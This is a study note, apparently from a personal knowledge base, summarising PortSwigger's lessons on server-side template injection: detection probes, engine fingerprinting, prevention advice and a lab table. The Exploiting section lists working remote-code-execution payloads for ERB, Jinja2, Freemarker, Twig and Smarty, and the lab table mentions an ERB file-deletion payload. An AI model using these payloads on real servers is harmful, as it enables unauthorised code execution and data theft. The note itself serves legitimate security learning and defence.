---
tags: [hacking, web, portswigger, ssti]
type: vulnerability-category
source: https://portswigger.net/web-security/server-side-template-injection
last-verified: 2026-08-25
---

# Server-side template injection

## Up
- [[PortSwigger]]

## What it is
SSTI is when user input is injected into a template that the server-side **template engine** then evaluates as template syntax (not data). Because template expressions can reach objects and methods in the host language, SSTI often leads to remote code execution — and at minimum to file/data disclosure.

## How it arises
Concatenating user input into the template string:
```php
$output = $twig->render("Dear " . $_GET['name']);        // vulnerable
$output = $twig->render("Dear {first_name}", [...]);      // safe (data passed in)
```

## Detection
- **Plaintext context** — send a math expression: `${7*7}`, `{{7*7}}`. Output `49` means it's evaluated.
- **Code context** — you're already inside an expression; break out and append markup: `}}<tag>` / `'}%>...`.
- **Fuzz** with a polyglot to force an error: `${{<%[%'"}}%\` — an exception reveals the engine.

## Identify the engine
Different engines evaluate probes differently:
- `{{7*7}}` → `49` (Twig, Jinja2)
- `{{7*'7'}}` → `7777777` (Jinja2) vs `49` (Twig)
- `${7*7}` → evaluated (Freemarker/ERB-style `<%= 7*7 %>`)
- `a{*comment*}b` → `ab` (Smarty)
Error messages often name the engine/version.

## Exploiting
Read the engine's docs, explore the accessible environment (objects, config, globals), then craft an RCE. Typical payloads:
- **ERB (Ruby):** `<%= system('id') %>`
- **Jinja2 (Python):** `{{ self.__init__.__globals__.__builtins__.import('os').popen('id').read() }}`
- **Freemarker (Java):** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- **Twig (PHP):** `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}`
- **Smarty (PHP):** `{system('id')}`

## Prevention
- Don't let users edit templates. If they must, use a **logic-less** engine (e.g. Mustache).
- Sandbox template execution and run it in a locked-down, low-privilege container.
- Never concatenate user input into template strings — pass it as data/parameters.

## Labs
7 labs. Verify exact titles against the live page.

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| Basic server-side template injection | Apprentice | ERB `<%= system('rm ...') %>`. | |
| Basic server-side template injection (code context) | Apprentice | Break out of the expression, then run code. | |
| Server-side template injection using documentation | Practitioner | Identify the engine, read docs, craft RCE. | |
| Server-side template injection in an unknown language with a documented exploit | Practitioner | Fingerprint the engine, reuse a public exploit. | |
| Server-side template injection with information disclosure via user-supplied objects | Practitioner | Traverse exposed objects to read secrets. | |
| Server-side template injection in a sandboxed environment | Expert | Escape the sandbox to reach the filesystem. | |
| Server-side template injection with a custom exploit | Expert | Build a bespoke chain to RCE. | |
